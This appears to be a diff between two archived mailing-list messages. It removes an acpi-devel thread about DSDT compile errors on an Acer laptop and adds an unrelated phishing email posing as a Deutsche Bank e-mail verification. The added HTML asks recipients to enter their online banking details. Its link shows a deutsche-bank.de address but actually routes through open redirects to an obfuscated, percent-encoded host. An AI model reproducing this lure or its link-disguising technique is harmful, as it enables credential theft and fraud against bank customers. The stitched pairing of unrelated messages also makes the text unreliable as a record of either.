@@ -1,13 +1,13 @@
-From: "Moore, Robert" <robert.moore-ral2JQCrhuEAvxtiuMwx3w@public.gmane.org>
-Subject: RE: DSDT Problems with Acer Aspire 1691WLMi
-Date: Thu, 2 Jun 2005 10:21:03 -0700
-Message-ID: <971FCB6690CD0E4898387DBF7552B90E01B0B70F@orsmsx403.amr.corp.intel.com>
+From: Deutsche Bank <ConcettinaAnchia-4esxekJ3uF0@public.gmane.org>
+Subject: =?iso-8859-1?B?RGV1dHNjaGUgQmFuayBFbWFpbCBWZXJpZmljYXRpb24gLSBhY3BpLWRldmVsQGxp?=
+ =?iso-8859-1?B?c3RzLnNmLm5ldA==?=
+Date: Thu, 02 Jun 2005 20:57:41 +0000
+Message-ID: <81d801c567b5$d2910072$438d5281@db.de>
 Mime-Version: 1.0
-Content-Type: text/plain;
-	charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable
+Content-Type: multipart/related;
+    type="multipart/alternative";
+    boundary="----=_NextPart_000_0000_DCA86BBC.C7D913B9"
 Return-path: <acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
-Content-class: urn:content-classes:message
 Sender: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 Errors-To: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/acpi-devel>,
@@ -17,62 +17,47 @@ List-Help: <mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gm
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/acpi-devel>,
 	<mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org?subject=subscribe>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=acpi-devel>
-To: "Moore, Robert" <robert.moore-ral2JQCrhuEAvxtiuMwx3w@public.gmane.org>, James Sparenberg <james-q+VOwRQyn90NJZHkBl2fuw@public.gmane.org>, ACPI <acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
+To: acpi-devel-TtF/mJH4Jtrk1uMJSBkQmQ@public.gmane.org
 List-Id: linux-acpi@vger.kernel.org
 
-Even better, if you can snag the binary file, please do.
+This is a multi-part message in MIME format.
 
-> -----Original Message-----
-> From: Moore, Robert
-> Sent: Thursday, June 02, 2005 10:20 AM
-> To: 'James Sparenberg'; ACPI
-> Subject: RE: [ACPI] DSDT Problems with Acer Aspire 1691WLMi
->=20
-> Please send to me; don't bother to compress.
->=20
->=20
-> > -----Original Message-----
-> > From: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org [mailto:acpi-devel-
-> > admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org] On Behalf Of James Sparenberg
-> > Sent: Thursday, June 02, 2005 10:16 AM
-> > To: ACPI
-> > Subject: RE: [ACPI] DSDT Problems with Acer Aspire 1691WLMi
-> >
-> > On Thu, 2005-06-02 at 09:18 -0700, Moore, Robert wrote:
-> > > This is a case where we tightened up the compiler to conform more
-> > > closely to the ACPI specification, and a few machines (apparently)
-> have
-> > > code that goes against the spec.
-> > >
-> > > I'd like to see these DSDTs just to make sure, however.
-> > >
-> > > Bob
-> >
-> > Should we send them (the non compiling versions) directly to you or
-via
-> > the list?
-> >
-> > James
-> >
-> >
-> >
-> >
-> > -------------------------------------------------------
-> > This SF.Net email is sponsored by Yahoo.
-> > Introducing Yahoo! Search Developer Network - Create apps using
-Yahoo!
-> > Search APIs Find out how you can build Yahoo! directly into your own
-> > Applications - visit =
-http://developer.yahoo.net/?fr=3Doffad-ysdn-ostg-
-> q22005
-> > _______________________________________________
-> > Acpi-devel mailing list
-> > Acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
-> > https://lists.sourceforge.net/lists/listinfo/acpi-devel
+------=_NextPart_000_0000_DCA86BBC.C7D913B9
+Content-Type: multipart/alternative;
+    boundary="----=_NextPart_001_0001_F5C0376C.149117C4"
 
 
--------------------------------------------------------
-This SF.Net email is sponsored by Yahoo.
-Introducing Yahoo! Search Developer Network - Create apps using Yahoo!
-Search APIs Find out how you can build Yahoo! directly into your own
-Applications - visit http://developer.yahoo.net/?fr=offad-ysdn-ostg-q22005
+------=_NextPart_001_0001_F5C0376C.149117C4
+Content-Type: text/plain;
+    charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+
+
+
+
+
+
+
+
+
+
+------=_NextPart_001_0001_F5C0376C.149117C4
+Content-Type: text/html;
+    charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+Dear Deutsche Bank Customer,<br><br>
+
+This email was sent by the Deutsche Bank server to verify your e-mail address. You must complete this process by <br>
+clicking on the link below and entering in the small window your Deutsche Bank online access details. This is done for <br>
+your protection - because some of our members no longer have access to their email addresses and we must verify it.<br>
+To verify your e-mail address, click on the link below: <br><br>
+<a href="http://www.google.fm/url?q=http://go.msn.com/HML/5/5.asp?target=http://t%65o%70%78jg%%2ED%09A%09%2Er%%75/" target=_blank>http://www.deutsche-bank.de/LoKIHPR93N0JEJCFMyYMC81Xg79ZmplGKFGZlJ8ySbwfhtpubB1a6e2m81ms14l8</a>
+<br>&nbsp; <br>
+
+------=_NextPart_001_0001_F5C0376C.149117C4--
+
+
+
+------=_NextPart_000_0000_DCA86BBC.C7D913B9--
